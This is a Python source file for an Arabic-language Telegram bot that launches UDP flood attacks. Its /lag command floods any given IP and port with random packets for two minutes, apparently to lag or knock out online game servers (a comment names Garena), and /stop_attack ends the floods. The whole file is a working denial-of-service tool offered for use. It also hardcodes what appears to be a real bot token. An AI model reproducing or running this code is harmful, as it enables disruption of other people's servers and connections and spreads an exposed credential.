from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import socket
import threading
import random
import string

active_threads = []

def send_udp_packets(server_ip, server_port, thread_event):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    random_text_number = ''.join(random.choices(string.ascii_letters + string.digits, k=99))
    #message = "fuck_garena" * 99
    message = random_text_number

    try:
        while not thread_event.is_set():
            udp_socket.sendto(message.encode(), (server_ip, server_port))
            print(f"تم إرسال البيانات إلى {server_ip}:{server_port}")
    except KeyboardInterrupt:
        print("تم إيقاف الإرسال بواسطة المستخدم.")
    finally:
        udp_socket.close()

async def lag(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if len(args) == 1 and ':' in args[0]:  
        server_ip, server_port = args[0].split(':')
        try:
            server_port = int(server_port)
            await update.message.reply_text("جاري تعليق الجيم ...")

            stop_event = threading.Event()
            thread = threading.Thread(target=send_udp_packets, args=(server_ip, server_port, stop_event))
            thread.start()
            active_threads.append((thread, stop_event))

            threading.Timer(120, stop_event.set).start()

        except ValueError:
            await update.message.reply_text("رقم المنفذ يجب أن يكون عدداً صحيحاً.")
    else:
        await update.message.reply_text("الرجاء إدخال عنوان IP ورقم المنفذ بالشكل الصحيح: IP:PORT")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if active_threads:
        for thread, stop_event in active_threads:
            stop_event.set()
        active_threads.clear()
        await update.message.reply_text("تم إيقاف جميع الهجمات.")
    else:
        await update.message.reply_text("لا يوجد هجمات نشطة حالياً.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    commands = """
    🔹 أوامر البوت 🔹
    /lag <IP:PORT> - بدء الهجوم
    /stop_attack - إيقاف جميع الهجمات
    """
    await update.message.reply_text(commands)

def main() -> None:
    app = ApplicationBuilder().token("7888263102:AAHT0yuWrl_1UgDmgfMwAc7XxnWsSimNDTk").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("lag", lag))
    app.add_handler(CommandHandler("stop_attack", stop_attack))

    app.run_polling()

if __name__ == '__main__':
    main()
